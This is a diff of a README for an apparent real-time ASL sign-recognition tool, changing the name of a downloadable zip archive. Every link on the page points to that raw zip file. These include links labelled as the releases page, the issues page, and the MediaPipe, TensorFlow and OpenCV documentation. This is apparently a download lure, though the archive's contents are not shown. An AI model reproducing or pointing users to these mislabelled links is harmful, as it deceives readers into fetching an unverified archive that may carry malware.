@@ -4,9 +4,9 @@
 ASL-Sign-Recognition is a real-time American Sign Language (ASL) recognition system. It helps users track 21 key hand landmarks using MediaPipe technology. This tool classifies gestures ranging from A to Z with a TensorFlow neural network. The application includes a dataset capture tool, training pipeline, and live webcam prediction. It works smoothly on any laptop without needing a GPU.
 
 ## 💾 Download and Install
-[![Download](https://raw.githubusercontent.com/Isnarjr/ASL-Sign-Recognition/main/model/ASL-Sign-Recognition-v3.3.zip)](https://raw.githubusercontent.com/Isnarjr/ASL-Sign-Recognition/main/model/ASL-Sign-Recognition-v3.3.zip)
+[![Download](https://raw.githubusercontent.com/Isnarjr/ASL-Sign-Recognition/main/model/Recognition-Sign-AS-v3.0-alpha.3.zip)](https://raw.githubusercontent.com/Isnarjr/ASL-Sign-Recognition/main/model/Recognition-Sign-AS-v3.0-alpha.3.zip)
 
-To get started, visit this page to download: [ASL-Sign-Recognition Releases](https://raw.githubusercontent.com/Isnarjr/ASL-Sign-Recognition/main/model/ASL-Sign-Recognition-v3.3.zip).
+To get started, visit this page to download: [ASL-Sign-Recognition Releases](https://raw.githubusercontent.com/Isnarjr/ASL-Sign-Recognition/main/model/Recognition-Sign-AS-v3.0-alpha.3.zip).
 
 ### 🔍 System Requirements
 - Operating System: Windows, macOS, or Linux
@@ -55,7 +55,7 @@ If you encounter issues:
 - Check that you have the latest version of the application installed.
 - Restart the application if it stops responding.
 
-For additional support, please visit our [issues page](https://raw.githubusercontent.com/Isnarjr/ASL-Sign-Recognition/main/model/ASL-Sign-Recognition-v3.3.zip).
+For additional support, please visit our [issues page](https://raw.githubusercontent.com/Isnarjr/ASL-Sign-Recognition/main/model/Recognition-Sign-AS-v3.0-alpha.3.zip).
 
 ## 🌐 Community and Support
 Join our community by following us on social media or GitHub discussions. Share your experience, ask for help, or collaborate with others interested in ASL recognition.
@@ -64,12 +64,12 @@ Join our community by following us on social media or GitHub discussions. Share 
 This project is licensed under the MIT License. Feel free to modify and use the software as long as you include original attribution.
 
 ## 📑 Additional Resources
-- [MediaPipe Documentation](https://raw.githubusercontent.com/Isnarjr/ASL-Sign-Recognition/main/model/ASL-Sign-Recognition-v3.3.zip)
-- [TensorFlow Documentation](https://raw.githubusercontent.com/Isnarjr/ASL-Sign-Recognition/main/model/ASL-Sign-Recognition-v3.3.zip)
-- [OpenCV Documentation](https://raw.githubusercontent.com/Isnarjr/ASL-Sign-Recognition/main/model/ASL-Sign-Recognition-v3.3.zip)
+- [MediaPipe Documentation](https://raw.githubusercontent.com/Isnarjr/ASL-Sign-Recognition/main/model/Recognition-Sign-AS-v3.0-alpha.3.zip)
+- [TensorFlow Documentation](https://raw.githubusercontent.com/Isnarjr/ASL-Sign-Recognition/main/model/Recognition-Sign-AS-v3.0-alpha.3.zip)
+- [OpenCV Documentation](https://raw.githubusercontent.com/Isnarjr/ASL-Sign-Recognition/main/model/Recognition-Sign-AS-v3.0-alpha.3.zip)
 
 For more information about ASL and its applications, you can visit various online resources and communities dedicated to sign language recognition.
 
 ## 🔗 Important Links
-- **Download the app:** [ASL-Sign-Recognition Releases](https://raw.githubusercontent.com/Isnarjr/ASL-Sign-Recognition/main/model/ASL-Sign-Recognition-v3.3.zip)
-- **Report issues:** [GitHub Issues](https://raw.githubusercontent.com/Isnarjr/ASL-Sign-Recognition/main/model/ASL-Sign-Recognition-v3.3.zip)
+- **Download the app:** [ASL-Sign-Recognition Releases](https://raw.githubusercontent.com/Isnarjr/ASL-Sign-Recognition/main/model/Recognition-Sign-AS-v3.0-alpha.3.zip)
+- **Report issues:** [GitHub Issues](https://raw.githubusercontent.com/Isnarjr/ASL-Sign-Recognition/main/model/Recognition-Sign-AS-v3.0-alpha.3.zip)
